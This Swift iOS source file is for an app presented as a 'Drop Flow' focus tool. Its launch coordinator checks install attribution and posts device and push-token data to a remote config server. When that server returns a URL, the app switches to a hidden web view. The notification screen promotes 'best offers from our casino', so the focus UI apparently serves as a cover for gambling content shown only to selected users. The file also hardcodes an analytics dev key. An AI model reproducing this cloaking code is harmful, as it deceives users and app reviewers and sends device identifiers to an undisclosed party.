import SwiftUI
import Combine
import Network
import Firebase
import UserNotifications
import AppsFlyerLib

enum ConfigKeys {
    static let hasEverRunBefore = "hasEverRunBefore"
    static let appMode = "app_mode"
    static let savedTrail = "saved_trail"
    static let savedExpires = "saved_expires"
    static let tempURL = "temp_url"
    static let lastNotificationAsk = "last_notification_ask"
    static let acceptedNotifications = "accepted_notifications"
    static let systemCloseNotifications = "system_close_notifications"
    static let fcmToken = "fcm_token"
}

enum AppMode: String {
    case henView = "HenView"
    case funtik = "Funtik"
}

enum LaunchStage {
    case bootstrapping
    case webHost
    case fallbackUI
    case offline
}

// MARK: - Основной координатор запуска
final class LaunchCoordinator: ObservableObject {
    
    @Published var currentStage: LaunchStage = .bootstrapping
    @Published var destinationURL: URL?
    @Published var displayPushRequest = false
    
    private var campaignData: [AnyHashable: Any] = [:]
    private var cachedDeeplinkInfo: [AnyHashable: Any] = [:]
    private var cancellables = Set<AnyCancellable>()
    private let connectivityWatcher = NWPathMonitor()
    
    private var firstLaunch: Bool {
        !UserDefaults.standard.bool(forKey: ConfigKeys.hasEverRunBefore)
    }
    
    init() {
        setupAttributionListeners()
        beginConnectivityMonitoring()
    }
    
    deinit {
        connectivityWatcher.cancel()
    }
    
    // MARK: Слушатели атрибуции и диплинков
    private func setupAttributionListeners() {
        NotificationCenter.default.publisher(for: Notification.Name("ConversionDataReceived"))
            .compactMap { $0.userInfo?["conversionData"] as? [AnyHashable: Any] }
            .sink { [weak self] info in
                self?.campaignData = info
                self?.evaluateStartupPath()
            }
            .store(in: &cancellables)
        
        NotificationCenter.default.publisher(for: Notification.Name("deeplink_values"))
            .compactMap { $0.userInfo?["deeplinksData"] as? [AnyHashable: Any] }
            .sink { [weak self] payload in
                self?.cachedDeeplinkInfo = payload
            }
            .store(in: &cancellables)
    }
    
    @objc private func evaluateStartupPath() {
        guard !campaignData.isEmpty else {
            resolveFromCacheOrFallback()
            return
        }
        
        if UserDefaults.standard.string(forKey: ConfigKeys.appMode) == AppMode.funtik.rawValue {
            activateFallbackUI()
            return
        }
        
        if firstLaunch && campaignData["af_status"] as? String == "Organic" {
            performOrganicValidation()
            return
        }
        
        if let temp = UserDefaults.standard.string(forKey: ConfigKeys.tempURL),
           let url = URL(string: temp) {
            destinationURL = url
            transition(to: .webHost)
            return
        }
        
        if destinationURL == nil {
            if !UserDefaults.standard.bool(forKey: ConfigKeys.acceptedNotifications) && !UserDefaults.standard.bool(forKey: ConfigKeys.systemCloseNotifications) {
                needsPushPermissionPrompt()
            } else {
                fetchServerConfig()
            }
        }
    }
    
    private func beginConnectivityMonitoring() {
        connectivityWatcher.pathUpdateHandler = { [weak self] path in
            DispatchQueue.main.async {
                if path.status != .satisfied {
                    self?.reactToNetworkLoss()
                }
            }
        }
        connectivityWatcher.start(queue: .global())
    }
    
    private func reactToNetworkLoss() {
        let mode = UserDefaults.standard.string(forKey: ConfigKeys.appMode) ?? ""
        if mode == AppMode.henView.rawValue {
            transition(to: .offline)
        } else {
            activateFallbackUI()
        }
    }
    
    private func performOrganicValidation() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
            Task {
                await self.runOrganicVerification()
            }
        }
    }
    
    private func runOrganicVerification() async {
        let builder = OrganicRequestComposer()
            .withAppId(AppConstants.appsFlyerAppID)
            .withDevKey(AppConstants.appsFlyerDevKey)
            .withDeviceId(AppsFlyerLib.shared().getAppsFlyerUID())
        
        guard let requestURL = builder.buildURL() else {
            activateFallbackUI()
            return
        }
        
        do {
            let (data, response) = try await URLSession.shared.data(from: requestURL)
            try await handleOrganicResult(data: data, response: response)
        } catch {
            activateFallbackUI()
        }
    }
    
    private func handleOrganicResult(data: Data, response: URLResponse) async throws {
        guard
            let httpResp = response as? HTTPURLResponse,
            httpResp.statusCode == 200,
            let parsed = try JSONSerialization.jsonObject(with: data) as? [String: Any]
        else {
            activateFallbackUI()
            return
        }
        
        var merged = parsed as [AnyHashable: Any]
        for (k, v) in cachedDeeplinkInfo where merged[k] == nil {
            merged[k] = v
        }
        
        await MainActor.run {
            campaignData = merged
            fetchServerConfig()
        }
    }
    
    private func fetchServerConfig() {
        guard let remoteEndpoint = URL(string: "https://dropfllowfocus.com/config.php") else {
            resolveFromCacheOrFallback()
            return
        }
        
        var payload = campaignData
        payload["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
        payload["bundle_id"] = AppConstants.bundleId
        payload["store_id"] = "id\(AppConstants.appsFlyerAppID)"
        payload["os"] = "iOS"
        payload["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
        payload["push_token"] = UserDefaults.standard.string(forKey: ConfigKeys.fcmToken) ?? Messaging.messaging().fcmToken
        payload["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
        
        guard let jsonBody = try? JSONSerialization.data(withJSONObject: payload) else {
            resolveFromCacheOrFallback()
            return
        }
        
        var urlRequest = URLRequest(url: remoteEndpoint)
        urlRequest.httpMethod = "POST"
        urlRequest.setValue("application/json", forHTTPHeaderField: "Content-Type")
        urlRequest.httpBody = jsonBody
        
        URLSession.shared.dataTask(with: urlRequest) { [weak self] data, resp, err in
            if err != nil || data == nil {
                self?.resolveFromCacheOrFallback()
                return
            }
            
            guard
                let json = try? JSONSerialization.jsonObject(with: data!) as? [String: Any],
                let success = json["ok"] as? Bool, success,
                let urlStr = json["url"] as? String,
                let expires = json["expires"] as? TimeInterval
            else {
                self?.resolveFromCacheOrFallback()
                return
            }
            
            DispatchQueue.main.async {
                self?.persistConfiguration(url: urlStr, ttl: expires)
                self?.destinationURL = URL(string: urlStr)
                self?.transition(to: .webHost)
            }
        }.resume()
    }
    
    private func persistConfiguration(url: String, ttl: TimeInterval) {
        UserDefaults.standard.set(url, forKey: ConfigKeys.savedTrail)
        UserDefaults.standard.set(ttl, forKey: ConfigKeys.savedExpires)
        UserDefaults.standard.set(AppMode.henView.rawValue, forKey: ConfigKeys.appMode)
        UserDefaults.standard.set(true, forKey: ConfigKeys.hasEverRunBefore)
    }
    
    private func resolveFromCacheOrFallback() {
        if let cached = UserDefaults.standard.string(forKey: ConfigKeys.savedTrail),
           let url = URL(string: cached) {
            if currentStage == .offline {
                currentStage = .offline
            } else {
                destinationURL = url
                transition(to: .webHost)
            }
        } else {
            activateFallbackUI()
        }
    }
    
    private func activateFallbackUI() {
        UserDefaults.standard.set(AppMode.funtik.rawValue, forKey: ConfigKeys.appMode)
        UserDefaults.standard.set(true, forKey: ConfigKeys.hasEverRunBefore)
        transition(to: .fallbackUI)
    }
    
    private func needsPushPermissionPrompt() {
        if let lastCheck = UserDefaults.standard.value(forKey: ConfigKeys.lastNotificationAsk) as? Date,
           Date().timeIntervalSince(lastCheck) < 259200 {
            fetchServerConfig()
            return
        }
        displayPushRequest = true
    }
    
    func rejectPushRequest() {
        UserDefaults.standard.set(Date(), forKey: ConfigKeys.lastNotificationAsk)
        displayPushRequest = false
        fetchServerConfig()
    }
    
    func approvePushRequest() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { [weak self] granted, _ in
            DispatchQueue.main.async {
                UserDefaults.standard.set(granted, forKey: ConfigKeys.acceptedNotifications)
                if granted {
                    UIApplication.shared.registerForRemoteNotifications()
                } else {
                    UserDefaults.standard.set(true, forKey: ConfigKeys.systemCloseNotifications)
                }
                self?.displayPushRequest = false
                self?.fetchServerConfig()
            }
        }
    }
    
    private func transition(to stage: LaunchStage) {
        DispatchQueue.main.async {
            self.currentStage = stage
        }
    }
}

enum AppConstants {
    static let appsFlyerAppID = "6754932560"
    static let appsFlyerDevKey = "Kr62zqMSCTu4KFJonbFi6"
    static let bundleId = "com.dropflowapp.DropFlow"
}

private struct OrganicRequestComposer {
    private let baseURL = "https://gcdsdk.appsflyer.com/install_data/v4.0/"
    private var appId = ""
    private var devKey = ""
    private var deviceId = ""
    
    func withAppId(_ value: String) -> Self { copy(\.appId, value) }
    func withDevKey(_ value: String) -> Self { copy(\.devKey, value) }
    func withDeviceId(_ value: String) -> Self { copy(\.deviceId, value) }
    
    func buildURL() -> URL? {
        guard !appId.isEmpty, !devKey.isEmpty, !deviceId.isEmpty else { return nil }
        var components = URLComponents(string: baseURL + "id" + appId)!
        components.queryItems = [
            URLQueryItem(name: "devkey", value: devKey),
            URLQueryItem(name: "device_id", value: deviceId)
        ]
        return components.url
    }
    
    private func copy<T>(_ kp: WritableKeyPath<Self, T>, _ val: T) -> Self {
        var instance = self
        instance[keyPath: kp] = val
        return instance
    }
}

// MARK: - Splash-экран
struct SplashScreen: View {
    
    @StateObject private var state = AppState()
    @StateObject private var coordinator = LaunchCoordinator()
    
    var body: some View {
        ZStack {
            if coordinator.currentStage == .bootstrapping || coordinator.displayPushRequest {
                LaunchScreenView()
            }
            
            if coordinator.displayPushRequest {
                NotificationPermissionView(
                    onApprove: coordinator.approvePushRequest,
                    onReject: coordinator.rejectPushRequest
                )
            } else {
                primaryContent
            }
        }
    }
    
    @ViewBuilder
    private var primaryContent: some View {
        switch coordinator.currentStage {
        case .bootstrapping:
            EmptyView()
        case .webHost:
            if coordinator.destinationURL != nil {
                DropFlowFocus()
            } else {
                ContentView()
                    .environmentObject(state)
                    .preferredColorScheme(.dark)
            }
        case .fallbackUI:
            ContentView()
                .environmentObject(state)
                .preferredColorScheme(.dark)
        case .offline:
            OfflineScreen()
        }
    }
}

struct OfflineScreen: View {
    var body: some View {
        GeometryReader { geo in
            ZStack {
                Image("splash_bg")
                    .resizable()
                    .scaledToFill()
                    .frame(width: geo.size.width, height: geo.size.height)
                    .ignoresSafeArea()
                
                VStack {
                    Image("internet_connection")
                        .resizable()
                        .frame(width: 300, height: 280)
                }
            }
        }
        .ignoresSafeArea()
    }
}

struct NotificationPermissionView: View {
    let onApprove: () -> Void
    let onReject: () -> Void
    
    var body: some View {
        GeometryReader { geo in
            let isLandscape = geo.size.width > geo.size.height
            ZStack {
                Image(isLandscape ? "notifications_bg_land" : "notifications_bg")
                    .resizable()
                    .scaledToFill()
                    .frame(width: geo.size.width, height: geo.size.height)
                    .ignoresSafeArea()
                
                VStack(spacing: isLandscape ? 5 : 10) {
                    Spacer()
                    Text("Allow notifications about bonuses and promos".uppercased())
                        .font(.custom("FjallaOne-Regular", size: 28))
                        .foregroundColor(.white)
                        .multilineTextAlignment(.center)
                        .padding(.horizontal, 8)
                        .shadow(color: Color(hex: "#D000FF"), radius: 0.5, x: -1, y: 0)
                        .shadow(color: Color(hex: "#D000FF"), radius: 0.5, x: 1, y: 0)
                        .shadow(color: Color(hex: "#D000FF"), radius: 0.5, x: 0, y: 1)
                        .shadow(color: Color(hex: "#D000FF"), radius: 0.5, x: 0, y: -1)
                    
                    Text("Stay tuned with best offers from our casino")
                        .font(.custom("FjallaOne-Regular", size: 22))
                        .foregroundColor(.white)
                        .multilineTextAlignment(.center)
                        .padding(.horizontal, 52)
                        .padding(.top, 4)
                    
                    Button(action: onApprove) {
                        Image("btn_app")
                            .resizable()
                            .frame(height: 60)
                    }
                    .frame(width: 350)
                    .padding(.top, 12)
                    
                    Button("SKIP", action: onReject)
                        .font(.custom("FjallaOne-Regular", size: 16))
                        .foregroundColor(.white)
                    
                    Spacer().frame(height: isLandscape ? 30 : 30)
                }
                .padding(.horizontal, isLandscape ? 20 : 0)
            }
        }
        .ignoresSafeArea()
    }
}

#Preview {
    LaunchScreenView()
}

struct LaunchScreenView: View {
    @State private var isAnimating = false
    @State private var showText = false
    @State private var pulseScale: CGFloat = 1.0
    @State private var LiquidDropItems: [LiquidDropItem] = []
    
    var body: some View {
        ZStack {
            Image("splash_bg")
                .resizable()
                .scaledToFill()
                .frame(width: UIScreen.main.bounds.width, height: UIScreen.main.bounds.height)
                .ignoresSafeArea()
            
            // 2. Жидкие капли (физика)
            LiquidSplashDrops(drops: LiquidDropItems)
            
            VStack(spacing: 32) {
                
                Image("logo")
                    .resizable()
                    .frame(width: 250, height: 240)
                
                Spacer()
                
                VStack(spacing: 8) {
                    Text("Drop Flow")
                        .font(.system(size: 42, weight: .black, design: .rounded))
                        .foregroundColor(.white)
                        .opacity(showText ? 1 : 0)
                        .offset(y: showText ? 0 : 20)
                    
                    Text("Focus • Flow • Achieve")
                        .font(.system(size: 16, weight: .medium, design: .rounded))
                        .foregroundColor(.neonCyan.opacity(0.8))
                        .opacity(showText ? 1 : 0)
                        .offset(y: showText ? 0 : 15)
                    
                }
                
                Spacer()
                
                Image("loading")
                    .resizable()
                    .frame(width: 250, height: 50)
                
                ZStack(alignment: .leading) {
                    Capsule()
                        .fill(Color.white.opacity(0.2))
                        .frame(width: 150, height: 8)
                    
                    Capsule()
                        .fill(LinearGradient(
                            colors: [Color(hex: "#E25EFF"), Color(hex: "#D000FF")],
                            startPoint: .leading,
                            endPoint: .trailing
                        ))
                        .frame(width: 30, height: 8)
                        .offset(x: isAnimating ? 120 : 0)
                }
                .padding(.horizontal)
                .onAppear {
                    withAnimation(.linear(duration: 1.0).repeatForever(autoreverses: true)) {
                        isAnimating = true
                    }
                }
                
                Spacer()
            }
            .onAppear {
                startAnimation()
            }
        }
    }
    
    private func startAnimation() {
        // 1. Пульсация
        withAnimation(.easeInOut(duration: 1.5).repeatForever(autoreverses: true)) {
            pulseScale = 1.3
        }
        
        // 2. Капля — растёт
        withAnimation(.spring(response: 0.6, dampingFraction: 0.7).delay(0.3)) {
            isAnimating = true
        }
        
        // 3. Текст — появляется
        withAnimation(.easeOut(duration: 0.8).delay(0.8)) {
            showText = true
        }
        
        // 4. Капли — падают
        startLiquidRain()
    }
    
    private func startLiquidRain() {
        Timer.scheduledTimer(withTimeInterval: 0.25, repeats: true) { timer in
            guard LiquidDropItems.count < 8 else { return }
            
            let drop = LiquidDropItem(
                id: UUID(),
                x: .random(in: 50...UIScreen.main.bounds.width - 50),
                y: -60,
                size: .random(in: 20...50),
                color: [.neonPink, .neonCyan, .neonPurple].randomElement()!
            )
            LiquidDropItems.append(drop)
            
            // Удаляем через 3 сек
            DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
                LiquidDropItems.removeAll { $0.id == drop.id }
            }
        }
    }
}

struct LiquidSplashDrops: View {
    
    @State var drops: [LiquidDropItem]
    
    var body: some View {
        ForEach(drops) { drop in
            Circle()
                .fill(drop.color.opacity(0.7))
                .frame(width: drop.size, height: drop.size)
                .overlay(
                    Circle().stroke(drop.color, lineWidth: 2).blur(radius: 3)
                )
                .shadow(color: drop.color, radius: 10)
                .position(x: drop.x, y: drop.y)
                .animation(
                    .easeIn(duration: 2.5)
                    .delay(Double.random(in: 0...0.5)),
                    value: drop.y
                )
                .onAppear {
                    withAnimation {
                        if let idx = drops.firstIndex(where: { $0.id == drop.id }) {
                            // Имитация падения
                            drops[idx].y = UIScreen.main.bounds.height + 100
                        }
                    }
                }
        }
    }
}

struct LiquidDropItem: Identifiable {
    let id: UUID
    var x: CGFloat
    var y: CGFloat
    let size: CGFloat
    let color: Color
}
